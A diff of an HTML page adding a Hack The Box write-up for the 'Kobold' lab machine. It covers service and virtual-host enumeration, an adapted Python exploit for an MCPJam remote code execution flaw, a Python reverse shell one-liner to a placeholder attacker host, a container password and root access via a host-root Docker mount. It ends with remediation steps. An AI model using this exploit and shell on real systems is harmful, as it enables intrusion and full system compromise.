@@ -5,7 +5,6 @@
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   <title>HTB Writeup - Kobold</title>
-  <link href="../../assets/Icone.png" rel="icon" type="image/png" />
   <script>
     (function () {
       const THEME_STORAGE_KEY = 'portfolio-theme';
@@ -38,7 +37,7 @@
 </head>
 
 <body class="challenge-body">
-  <header class="challenge-hero">
+    <header class="challenge-hero" style="position: relative;">
     <div style="position: absolute; top: 1.5rem; right: 2rem; z-index: 10;">
       <button aria-label="Switch to light mode" class="theme-toggle" data-theme-toggle="" type="button">
         <span class="theme-track">
@@ -55,7 +54,7 @@
       <div class="challenge-meta">
 
         <div class="challenge-icon-container">
-          <img alt="Facts Machine Icon" class="challenge-icon" src="./assets/machine_image.png" />
+          <img alt="Kobold Machine Icon" class="challenge-icon" src="./assets/machine_image.png" />
         </div>
         <div>
           <span class="meta-label">Difficulty</span>
@@ -67,7 +66,7 @@
         </div>
         <div>
           <span class="meta-label">Platform</span>
-          <span class="meta-value" , src="color:green">Hack The Box</span>
+          <span class="meta-value" , src="color:green">HackTheBox</span>
         </div>
         <div>
           <span class="meta-label">IP Address</span>
@@ -81,20 +80,344 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+        Kobold is an easy Linux machine focused on virtual host enumeration, web application exploitation, container abuse, and privilege escalation through Docker misconfigurations.
       </p>
+    </section>
+
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
+      </header>
+      <p>
+        The assessment begins with a service enumeration phase using <strong>Nmap</strong> to identify exposed services.
+      </p>
+      <p class="center-code">
+        <code class="language-bash">nmap -sC -sV 10.129.16.47</code>
+      </p>
+      <p>
+        The scan reveals three accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://kobold.htb/
+443/tcp  open     ssl/http nginx 1.24.0 (Ubuntu)
+|_http-title: 400 The plain HTTP request was sent to HTTPS port
+| ssl-cert: Subject: commonName=kobold.htb
+| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
+| Not valid before: 2026-03-15T15:08:55
+|_Not valid after:  2125-02-19T15:08:55
+            </code></pre>
+      </p>
+      <p>
+        The web server redirects requests to the virtual host <code>kobold.htb</code>. To interact with the application correctly, the hostname was added to the local <code>/etc/hosts</code> file.
+      </p>
+      <p>
+        <code class="language-bash">echo "10.129.16.47  kobold.htb" >> /etc/hosts</code>
+      </p>
+            <header class="section-heading">
+        <h2 id="overview-title">VHost Enumeration</h2>
+      </header>
+      <p>Virtual host enumeration was performed to identify additional exposed services hosted on the target domain.</p>
+      <p>
+        <code class="language-bash">ffuf -w /snap/seclists/current/Discovery/DNS/combined_subdomains.txt -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -mc all -fw 4 </code>
+      <pre class="terminal">
+              <code>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://kobold.htb
+ :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/DNS/combined_subdomains.txt
+ :: Header           : Host: FUZZ.kobold.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 4
+________________________________________________
+
+bin                     [Status: 200, Size: 24392, Words: 1218, Lines: 386]
+mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15]             
+ </code></pre>
+      </p>
+      <p>The enumeration identified two additional virtual hosts:</p>
+      <p>
+        <ul>
+          <li><strong>bin.kobold.htb</strong>, hosting <strong>PrivateBin 2.0.2</strong></li>
+          <li><strong>mcp.kobold.htb</strong>, hosting <strong>MCPJam 1.4.2</strong></li>
+        </ul>
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">Vulnerability Analysis</h2>
+      </header>
+
+      <p><strong>mcp.kobold.htb</strong> hosts an instance of <strong>MCPJam v1.4.2</strong>, which is vulnerable to a remote code execution vulnerability identified as <strong>CVE-2026-23744</strong>. A public proof-of-concept exploit is available on GitHub <a class="ref" href="#references">[1]</a>.</p>
+      <p>The public exploit was not directly compatible with the target environment because it assumed the default MCPJam configuration, including port <strong>6274</strong> and the use of HTTP instead of HTTPS. To adapt the exploit for the target system, the protocol was changed to HTTPS, the correct port was specified, and SSL certificate verification was disabled.</p>
+      <p>
+        <code class="language-python">import subprocess
+import time
+import requests
+import os
+import signal
+import sys
+
+def reproduce(target_ip, command):
+    print(f"[*] Waiting for server to start on port 6274...")
+    
+    start_time = time.time()
+    server_ready = False
+    
+    while time.time() - start_time < 30:
+        try:
+            response = requests.get(f"https://{target_ip}", timeout=1, verify=False)
+            if response.status_code == 200:
+                server_ready = True
+                break
+        except requests.exceptions.ConnectionError:
+            time.sleep(1)
+            continue
+    
+    if not server_ready:
+        print("[!] Server failed to start in time.")
+        # Note: Removed the process kill since 'process' variable doesn't exist
+        return
+
+    print("[+] Server is up and running.")
+
+    # 4. Send the exploit payload
+    print("[*] Sending exploit payload...")
+    exploit_url = f"https://{target_ip}/api/mcp/connect"
+    
+    cmd = "sh"
+    args = ["-c", command]
+    
+    payload = {
+        "serverConfig": {
+            "command": cmd,
+            "args": args,
+            "env": {
+                "DISPLAY": os.environ.get("DISPLAY", ":0")
+            }
+        },
+        "serverId": "rce_test"
+    }
+    
+    try:
+        response = requests.post(exploit_url, json=payload, timeout=5, verify=False)
+        print(f"[*] Server responded: {response.status_code}")
+        print(f"[*] Response body: {response.text}")
+    except Exception as e:
+        print(f"[*] Request failed (this might be expected if the command execution interrupts the connection): {e}")
+
+    print("[+] Payload sent.")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <target_ip> 'id > /tmp/mcpjam_pwned.txt'")
+        print(f"Usage: {sys.argv[0]} <target_ip> 'xcalc'")
+        sys.exit(1)
+    
+    target_ip = sys.argv[1]
+    command = sys.argv[2]
+    
+    reproduce(target_ip, command)</code>
+      </p>
+
+      <p>Using the modified exploit, the following Python reverse shell payload was executed on the target system:</p>
+      <p class="center-code">
+        <code class="language-bash">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;ATTACKER_IP&gt;",&lt;ATTACKER_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</code>
+      </p>
+      <p>Successful exploitation provided a reverse shell as the user <strong>ben</strong>.</p>
+      <p class="center-code">
+        <code class="language-bash">id</code>
+      </p>
+<p>
+  <pre class="terminal">
+<code>
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
+
+</code></pre>
+</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Internal Service Enumeration</h2>
+      </header>
+      <p>Internal services running on the host were enumerated after obtaining shell access.</p>
+
+      <p class="center-code">
+        <code class="language-bash">netstat -tlnp</code>
+      </p>
+<p>
+  <pre class="terminal">
+<code>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6274          0.0.0.0:*               LISTEN      1605/node           
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:42519         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::3552                 :::*                    LISTEN      - 
+
+</code></pre>
+</p>
+<table>
+      <tr>
+        <th>Local Address</th>
+        <th>Service</th>
+      </tr>
+      <tr>
+        <td>127.0.0.1:6274</td>
+        <td>MCPJam (<strong>https://mcp.kobold.htb/</strong>)</td>
+      </tr>
+      <tr>
+        <td>127.0.0.1:8080</td>
+        <td>PrivateBin (<strong>https://bin.kobold.htb/</strong>)</td>
+      </tr>
+      <tr>
+        <td>:::3552</td>
+        <td>Arcane (<strong>http://kobold.htb:3552/</strong>)</td>
+      </tr>
+</table>
+<p>Arcane appears to be a container management platform, suggesting that the host may contain Docker containers storing sensitive configuration data or credentials useful for further exploitation.</p>
+<p><strong>LinPEAS</strong> was used to perform automated privilege escalation checks and identify potential misconfigurations on the target system.</p>
+
+<header class="section-heading">
+        <h2 id="overview-title">Docker Group Enumeration</h2>
+      </header>
+
+      <p>The <strong>LinPEAS</strong> output revealed that the user <code>ben</code> belongs to the <code>docker</code> group. Although this membership did not initially appear in the output of the <strong>id</strong> command, the current session was refreshed using <strong>newgrp</strong> to apply the updated group membership.</p>
+
+      <pre class="terminal">
+<code>
+╔══════════╣ Actual Group Memberships via newgrp (T1069.001)
+
+Accessible group not shown in id: docker (gid=111)
+
+</code></pre>
+<p>The following command was executed to refresh the active group memberships:</p>
+<p class="center-code">
+        <code class="language-bash">newgrp docker</code>
+      </p>
+
+<header class="section-heading">
+        <h2 id="overview-title">Docker Enumeration</h2>
+      </header>
+
+<p>Docker containers running on the host were enumerated:</p>
+<p class="center-code">
+        <code class="language-bash">docker ps</code>
+      </p>
+
+<pre class="terminal">
+<code>
+CONTAINER ID   IMAGE                               COMMAND                  CREATED        STATUS             PORTS                      NAMES
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   2 months ago   Up About an hour   127.0.0.1:8080->8080/tcp   bin
+
+</code></pre>
+<p>The container hosts the <strong>PrivateBin</strong> platform. A shell was opened inside the container to inspect its configuration files.</p>
+
+<p class="center-code">
+        <code class="language-bash">docker exec -it 4c49dd7bb727 sh
+cat /srv/cfg/conf.php</code>
+      </p>
+
+<pre class="terminal">
+<code>
+[model_options]
+dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
+tbl = "privatebin_"    ; table prefix
+usr = "privatebin"
+pwd = "ComplexP@sswordAdmin1928"
+opt[12] = true   ; PDO::ATTR_PERSISTENT
+
+</code></pre>
+<p>The PrivateBin database password was successfully retrieved.</p>
+
+<header class="section-heading">
+        <h2 id="overview-title">Arcane Abuse & Privilege Escalation</h2>
+      </header>
+      <p>The previously recovered credentials were used to authenticate to the Arcane platform at <code>http://kobold.htb:3552/</code> using the account <code>arcane</code>.</p>
+      <p>A new container was created through the Arcane interface using the following parameters:</p>
+      <ul>
+        <li><strong>Image</strong>: privatebin/nginx-fpm-alpine:2.0.2</li>
+        <li><strong>User</strong>: root </li>
+        <li><strong>Volume Mounts</strong>: /:/TEST, mounting the host root filesystem inside the container under the directory <strong>/TEST</strong></li>
+      </ul>
+      <img src="./assets/Arcane1.png" width="100%"/>
+      <img src="./assets/Arcane2.png" width="100%"/>
+
+      <p>The new container creation was verified from Ben's SSH session:</p>
+      <p class="center-code">
+        <code class="language-bash">docker ps</code>
+      </p>
+
+<pre class="terminal">
+<code>
+CONTAINER ID   IMAGE                               COMMAND                  CREATED          STATUS          PORTS                      NAMES
+4e8a16b372c8   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   23 seconds ago   Up 23 seconds   8080/tcp                   TEST
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   2 months ago     Up 10 minutes   127.0.0.1:8080->8080/tcp   bin
+
+</code></pre>
+
+    <p>A shell was opened inside the container using Docker, allowing access to the mounted host filesystem through the <strong>/TEST</strong> directory.</p>
+    <img src="./assets/Read TEST content.png" width="100%"/>
+
+    <p>Because the host root filesystem was mounted inside the container, it became possible to access files belonging to the root user and fully compromise the system.</p>
+
     </section>
 
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Proof of Completion</p>
-        <h2 id="overview-title">Proof of Completion</h2>
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
       </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade <strong>MCPJam</strong> to version <strong>1.4.3 or later</strong></li>
+        <li>Remove unnecessary users from the <code>docker</code> group.</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/boroeurnprach/CVE-2026-23744-PoC"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | CVE-2026-23744-PoC</a>
+        </li>
+      </ol>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
       <img src="./assets/machine_solved.png" width="100%"/>
     </section>
 
